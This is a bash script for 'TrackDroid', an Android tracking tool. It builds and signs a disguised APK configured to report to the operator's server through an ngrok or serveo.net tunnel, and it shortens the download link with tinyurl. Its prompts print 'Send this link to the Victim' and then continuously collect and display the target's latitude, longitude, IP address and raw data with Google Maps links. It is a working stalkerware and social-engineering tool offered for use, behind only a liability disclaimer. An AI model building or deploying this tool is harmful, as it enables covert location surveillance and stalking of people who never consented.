#!/bin/bash
# TrackDroid v1.0
# Author: @linux_choice (You don't become a coder by just changing the credits)
# Instagram: @linux_choice
# Github: https://github.com/thelinuxchoice/trackdroid

trap 'printf "\n";stop' 2
var_ngrok=0

stop() {

if [[ $checkphp == *'ngrok'* ]]; then
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1


}

dependencies() {


command -v apksigner > /dev/null 2>&1 || { echo >&2 "I require apksigner but it's not installed. Install it: apt-get install apksigner. Aborting."; 
exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; 
exit 1; }

command -v gradle > /dev/null 2>&1 || { echo >&2 "I require gradle but it's not installed. Install it. Aborting."; 
exit 1; }

}

banner() {

printf "    \e[1;77m  ____            _     _ \e[0m\e[1;31m_____               _              \e[0m\n"
printf "    \e[1;77m |  _ \ _ __ ___ (_) __| |\e[0m\e[1;31m_   _| __ __ _  ___| | _____ _ __  \e[0m\n"
printf "    \e[1;77m | | | | '__/ _ \| |/ _\` |\e[0m\e[1;31m | || '__/ _\` |/ __| |/ / _ \ '__|\e[0m \n"
printf "    \e[1;77m | |_| | | | (_) | | (_| |\e[0m\e[1;31m | || | | (_| | (__|   <  __/ |    \e[0m\n"
printf "    \e[1;77m |____/|_|  \___/|_|\__,_|\e[0m\e[1;31m |_||_|  \__,_|\___|_|\_\___|_|    \e[0m\n"
                                                            
printf "\n\e[1;92m                          Android Tracker\e[0m\e[1;77m v1.0\e[0m\n"
printf "       \e[1;77mAuthor: https://github.com/thelinuxchoice/droidtracker\n\e[0m"
printf "\n"
printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not      ::\e[0m\n"
printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by droidtracker ::\e[0m\n"
printf "\n"
}



createmain() {

ngrok=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configuring App...\e[0m\n"
sed s+forwarding+$ngrok+g app/utils.java  > app/app/src/main/java/com/google/android/gms/location/sample/locationupdatespendingintent/Utils.java

}

createmain_serveo() {

printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configuring App...\e[0m\n"
sed s+forwarding+http://serveo.net:$port+g app/utils.java  > app/app/src/main/java/com/google/android/gms/location/sample/locationupdatespendingintent/Utils.java

}


checkrcv() {

if [[ -e location.txt ]]; then
rm -rf location.txt
fi

if [[ -e raw.txt ]]; then
rm -rf raw.txt
fi

printf "\n"

printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting Locations, \e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"

while [ true ]; do

if [[ -e location.txt ]]; then
cat location.txt >> history.location
cat raw.txt >> history.raw
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Last Location Updated:\n\n"
IFS=$'\n'
location=$(grep -o 'Latitude' location.txt | wc -l)
date=$(grep 'Date:' location.txt | cut -d " " -f2-10)
ip=$(grep 'IP:' location.txt | cut -d " " -f2-4)
printf "\e[1;92m%s\e[0m\e[1;77m Location Reported\e[0m\n" $location
printf "\e[1;77m%s\e[0m\n" $date
printf "\e[1;92mIP:\e[0m\e[1;77m %s\e[0m\n\n" $ip
IFS=$'\n'
for line in $(cat location.txt); do
latitude=$(echo "$line" | grep 'Latitude' | cut -d " " -f2 | tr -d ',')
longitude=$(echo "$line" | grep 'Longitude' | cut -d " " -f4 | tr -d ')')

if [[ $latitude != "" ]] ; then
printf "\e[1;92mLatitude:\e[0m\e[1;77m %s, \e[0m\e[1;92mLongitude:\e[0m\e[1;77m %s\e[0m\n" $latitude $longitude
printf "\e[1;93mhttp://www.google.com/maps/place/%s,%s\e[0m\n\n" $latitude $longitude
fi

done
IFS=$'\n'
raw=$(cat raw.txt)
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Raw Data:\n"
cat raw.txt 
rm -rf location.txt raw.txt
fi
 
sleep 1
done 

}


server_ngrok() {

php -S "localhost:3333" > /dev/null 2>&1  &
sleep 2
if [[ -e ngrok ]]; then
printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 5
else
rm -rf ngrok-stable-linux-386.* > /dev/null 2>&1
printf "\e[1;92m[\e[0m*\e[1;92m] Downloading ngrok server...\n"
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip

printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 5
else
printf "\e[1;93m [!] Download Error!\e[0m\n"
exit 1
fi
fi

}

server_serveo() {
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"

fuser -k 3333/tcp > /dev/null 2>&1
fuser -k 4444/tcp > /dev/null 2>&1
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net -R '$port':localhost:4444 2> /dev/null > sendlink' &
sleep 7
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s/%s.apk \n' $send_link $appname
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link/$appname.apk | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"

php -S "localhost:3333" > /dev/null 2>&1  &
php -S "localhost:4444" > /dev/null 2>&1  &
sleep 3
checkrcv
}


checkapk() {
if [[ -e app/app/build/outputs/apk/app-release-unsigned.apk ]]; then

printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Build Successful, Signing APK...\e[0m\n"

mv app/app/build/outputs/apk/app-release-unsigned.apk $appname.apk
echo "      " | apksigner sign --ks key.keystore  $appname.apk > /dev/null

printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Done!\e[0m\e[1;92m Saved:\e[0m\e[1;77m app/%s.apk \e[0m\n" $appname
fi
default_start_server="Y"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Start Server? [Y/n] ' start_server
start_server="${start_server:-${default_start_server}}"
if [[ $start_server == "Y" || $start_server == "Yes" || $start_server == "yes" || $start_server == "y" ]]; then

if [[ "$var_ngrok" == 1 ]]; then
link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m+\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s/%s.apk\e[0m\n" $link $appname
checkrcv
else
server_serveo
fi
else
exit 1
fi

}

build() {
default_start_build="Y"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Start build? [Y/n]: ' start_build
start_build="${start_build:-${default_start_build}}"
if [[ $start_build == "Y" || $start_build == "Yes" || $start_build == "yes" || $start_build == "y" ]]; then
cd app/
chmod +x gradlew
./gradlew build
cd ../
checkapk
else
exit 1
fi
}

port_conn() {

default_port=$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Choose a Port (Default:\e[0m\e[1;92m %s \e[0m\e[1;77m): \e[0m' $default_port
read port
port="${port:-${default_port}}"

}

app_name() {

default_appname="App"
printf '\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] App Name (Default:\e[0m\e[1;92m %s \e[0m\e[1;77m): \e[0m' $default_appname
read appname
appname="${appname:-${default_appname}}"
sed s+AppName+$appname+g app/strings.xml > app/app/src/main/res/values/strings.xml


}

forwarding() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1  ]]; then
port_conn
createmain_serveo
build

elif [[ $option_server -eq 2 ]]; then
let var_ngrok=1
server_ngrok
createmain
build
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
forwarding
fi

}

start() {
killall -2 php > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
if [[ -e "sendlink" ]]; then
rm -rf sendlink 
fi

default_sdk_dir="/root/Android/Sdk"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Put Location of the SDK (Default /root/Android/Sdk): \e[0m' sdk_dir

sdk_dir="${sdk_dir:-${default_sdk_dir}}"

if [[ ! -d $sdk_dir ]]; then
printf "\e[1;93m[!] Directory Not Found!\e[0m\n"
sleep 1
start
else
printf "sdk.dir=%s\n" > app/local.properties $sdk_dir
app_name
forwarding
fi

}
banner
dependencies
start
